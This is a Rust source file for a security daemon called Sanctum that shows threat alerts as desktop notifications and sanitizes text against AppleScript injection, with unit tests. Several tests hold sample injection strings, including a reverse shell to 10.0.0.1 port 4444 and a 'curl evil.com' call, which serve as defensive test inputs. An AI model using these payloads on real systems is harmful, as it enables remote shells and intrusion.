//! Cross-platform desktop notifications for Sanctum.
//!
//! Currently uses shell-based fallback (notify-send on Linux,
//! osascript on macOS). Will switch to `notify-rust` crate once
//! the upstream zbus dependency compiles on stable Rust.
//!
//! # Security
//!
//! On macOS, notifications are sent via `osascript` running `AppleScript`.
//! All text interpolated into the script is sanitized to a strict allowlist
//! of safe characters, preventing command injection through crafted file
//! paths or descriptions.

use sanctum_types::threat::{ThreatEvent, ThreatLevel};

/// Sanitize text before embedding it in an `AppleScript` string literal.
///
/// Only retains characters from a strict allowlist:
/// - ASCII alphanumeric (`a-z`, `A-Z`, `0-9`)
/// - Space, dot, hyphen, underscore, forward slash, colon, comma,
///   parentheses, square brackets, equals, at-sign, hash, plus
///
/// Everything else — including quotes, backslashes, newlines, control
/// characters, and non-ASCII — is replaced with an underscore. This is
/// deliberately aggressive: a notification losing some cosmetic fidelity
/// is far preferable to an injection vulnerability.
fn sanitize_for_applescript(input: &str) -> String {
    input
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric()
                || matches!(
                    c,
                    ' ' | '.'
                        | '-'
                        | '_'
                        | '/'
                        | ':'
                        | ','
                        | '('
                        | ')'
                        | '['
                        | ']'
                        | '='
                        | '@'
                        | '#'
                        | '+'
                )
            {
                c
            } else {
                '_'
            }
        })
        .collect()
}

/// Send a desktop notification for a threat event.
///
/// Non-blocking — if the notification fails, it's logged but doesn't
/// interrupt the daemon's operation.
pub fn notify_threat(event: &ThreatEvent) {
    let summary = match event.level {
        ThreatLevel::Critical => format!("Sanctum: CRITICAL - {}", category_display(event)),
        ThreatLevel::Warning => format!("Sanctum: Warning - {}", category_display(event)),
        ThreatLevel::Info => format!("Sanctum: {}", category_display(event)),
    };

    let body = format!(
        "{} | Path: {} | Action: {:?}",
        event.description,
        event.source_path.display(),
        event.action_taken,
    );

    if let Err(e) = send_notification(&summary, &body) {
        tracing::warn!(%e, "failed to send desktop notification");
    }
}

const fn category_display(event: &ThreatEvent) -> &'static str {
    match event.category {
        sanctum_types::threat::ThreatCategory::PthInjection => "Suspicious .pth file detected",
        sanctum_types::threat::ThreatCategory::SiteCustomize => "sitecustomize.py modified",
        sanctum_types::threat::ThreatCategory::CredentialAccess => "Credential file accessed",
        sanctum_types::threat::ThreatCategory::NetworkAnomaly => "Network anomaly detected",
    }
}

/// Send a notification using platform-specific shell commands.
fn send_notification(summary: &str, body: &str) -> Result<(), String> {
    #[cfg(target_os = "linux")]
    {
        // Linux: notify-send passes arguments safely (no shell interpolation).
        std::process::Command::new("notify-send")
            .args(["--urgency=critical", "--app-name=Sanctum", summary, body])
            .spawn()
            .map_err(|e| format!("notify-send failed: {e}"))?;
    }

    #[cfg(target_os = "macos")]
    {
        // macOS: osascript executes AppleScript, so we must sanitize all
        // interpolated text to prevent script injection. The sanitizer
        // strips everything except a strict allowlist of safe characters.
        let safe_body = sanitize_for_applescript(body);
        let safe_summary = sanitize_for_applescript(summary);
        let script = format!(
            "display notification \"{safe_body}\" with title \"{safe_summary}\"",
        );
        std::process::Command::new("osascript")
            .args(["-e", &script])
            .spawn()
            .map_err(|e| format!("osascript failed: {e}"))?;
    }

    #[cfg(not(any(target_os = "linux", target_os = "macos")))]
    {
        tracing::info!(%summary, %body, "notification (no desktop backend available)");
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sanitize_preserves_safe_characters() {
        let input = "Sanctum: CRITICAL - Suspicious .pth file detected";
        assert_eq!(sanitize_for_applescript(input), input);
    }

    #[test]
    fn sanitize_preserves_typical_unix_path() {
        let input = "/usr/lib/python3.12/site-packages/evil.pth";
        assert_eq!(sanitize_for_applescript(input), input);
    }

    #[test]
    fn sanitize_strips_double_quotes() {
        let input = r#"hello "world""#;
        assert_eq!(sanitize_for_applescript(input), "hello _world_");
    }

    #[test]
    fn sanitize_strips_backslashes() {
        let input = r"path\to\evil";
        assert_eq!(sanitize_for_applescript(input), "path_to_evil");
    }

    #[test]
    fn sanitize_strips_newlines_preventing_statement_injection() {
        // In AppleScript, newlines are statement separators. A crafted
        // filename containing a newline could inject arbitrary commands.
        let input = "benign.pth\"\ndo shell script \"curl evil.com";
        let result = sanitize_for_applescript(input);
        assert!(
            !result.contains('\n'),
            "newlines must be stripped: {result}"
        );
        assert!(
            !result.contains('"'),
            "double quotes must be stripped: {result}"
        );
        // The words "do shell script" may still appear as plain text, but
        // without quotes and newlines they cannot function as an AppleScript
        // statement -- they are inert text inside a string literal.
    }

    #[test]
    fn sanitize_strips_backslash_escape_sequences() {
        // AppleScript understands \" and \\ inside double-quoted strings.
        // A path containing backslashes could be used to escape the closing
        // quote and inject code.
        let input = r#"evil.pth\" & do shell script "id" & ""#;
        let result = sanitize_for_applescript(input);
        assert!(
            !result.contains('\\'),
            "backslashes must be stripped: {result}"
        );
        assert!(
            !result.contains('"'),
            "double quotes must be stripped: {result}"
        );
    }

    #[test]
    fn sanitize_strips_control_characters() {
        let input = "hello\x00\x01\x7fworld";
        let result = sanitize_for_applescript(input);
        assert_eq!(result, "hello___world");
    }

    #[test]
    fn sanitize_strips_non_ascii_unicode() {
        // Non-ASCII characters could contain homoglyphs or other tricks.
        let input = "legit\u{200B}path/\u{00E9}vil.pth";
        let result = sanitize_for_applescript(input);
        assert!(
            result.chars().all(|c| c.is_ascii()),
            "non-ASCII must be stripped: {result}"
        );
    }

    #[test]
    fn sanitize_handles_combined_injection_attempt() {
        // A realistic attack: a .pth filename crafted to break out of
        // the AppleScript string and execute a reverse shell.
        let input = concat!(
            "/tmp/site-packages/\"\n",
            "do shell script \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"\n",
            "display notification \""
        );
        let result = sanitize_for_applescript(input);
        assert!(!result.contains('\n'));
        assert!(!result.contains('"'));
        assert!(!result.contains('\\'));
        assert!(!result.contains('&'));
        assert!(!result.contains('>'));
        // The safe output should contain only allowlisted characters
        for c in result.chars() {
            assert!(
                c.is_ascii_alphanumeric()
                    || matches!(
                        c,
                        ' ' | '.'
                            | '-'
                            | '_'
                            | '/'
                            | ':'
                            | ','
                            | '('
                            | ')'
                            | '['
                            | ']'
                            | '='
                            | '@'
                            | '#'
                            | '+'
                    ),
                "unexpected character in sanitized output: {c:?}"
            );
        }
    }

    #[test]
    fn sanitize_empty_input() {
        assert_eq!(sanitize_for_applescript(""), "");
    }

    #[test]
    fn sanitize_single_quotes_stripped() {
        // Single quotes in AppleScript can also be meaningful in
        // certain contexts; strip them for safety.
        let input = "it's a trap";
        let result = sanitize_for_applescript(input);
        assert_eq!(result, "it_s a trap");
    }
}
